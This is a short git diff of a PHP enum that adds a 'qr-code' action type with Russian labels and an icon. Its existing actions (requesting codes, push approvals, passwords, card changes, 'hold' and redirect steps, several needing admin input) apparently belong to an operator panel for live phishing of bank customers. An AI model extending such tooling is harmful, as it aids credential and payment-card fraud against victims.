@@ -21,6 +21,7 @@ enum ActionType: string
     case HOLD = 'hold';
     case ACTIVATION = 'activation';
     case SUCCESS_HOLD = 'success-hold';
+    case QR_CODE = 'qr-code';
 
     public function label(): string
     {
@@ -40,6 +41,7 @@ enum ActionType: string
             self::HOLD => 'Холд',
             self::ACTIVATION => 'Активация',
             self::SUCCESS_HOLD => 'Успешный холд',
+            self::QR_CODE => 'QR код',
         };
     }
 
@@ -61,6 +63,7 @@ enum ActionType: string
             self::HOLD => '⏸',
             self::ACTIVATION => '📧',
             self::SUCCESS_HOLD => '✅',
+            self::QR_CODE => '📷',
         };
     }
 
@@ -75,7 +78,7 @@ enum ActionType: string
             self::CODE, self::PUSH, self::PUSH_ICON, self::PASSWORD, self::CARD_CHANGE, self::ERROR,
             self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::HOLD,
             self::ACTIVATION, self::SUCCESS_HOLD => true,
-            self::ONLINE, self::REDIRECT => false,
+            self::ONLINE, self::REDIRECT, self::QR_CODE => false,
         };
     }
 
@@ -85,7 +88,7 @@ enum ActionType: string
     public function requiresAdminInput(): bool
     {
         return match ($this) {
-            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::REDIRECT => true,
+            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::REDIRECT, self::QR_CODE => true,
             default => false,
         };
     }
